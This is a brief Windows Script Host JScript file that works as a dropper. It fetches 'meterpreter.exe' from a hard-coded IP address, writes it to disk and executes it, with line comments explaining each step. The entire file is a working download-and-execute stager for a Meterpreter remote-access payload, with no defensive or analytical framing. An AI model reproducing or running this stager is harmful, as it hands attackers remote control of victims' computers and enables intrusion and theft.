var url = "http://1.2.3.4/meterpreter.exe";
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

// 1st Arg: HTTP Request
// 2nd Arg: the url
// 3rd Arg: SHould it be synchronous?
Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');
    Stream.Open();
    Stream.Type = 1; // adTypeBinary - indicate its binary content
    Stream.Write(Object.ResponseBody); // Save the response body
    Stream.Position = 0; // point the stream to the beginning of its content
    // 1st Arg: filename
    // 2nd Arg: SaveOptions Enum - 2=adSaveCreateOverWrite
    Stream.SaveToFile("meterpreter.exe", 2);
    Stream.Close();
}
var r = new ActiveXObject("WScript.Shell").Run("meterpreter.exe")
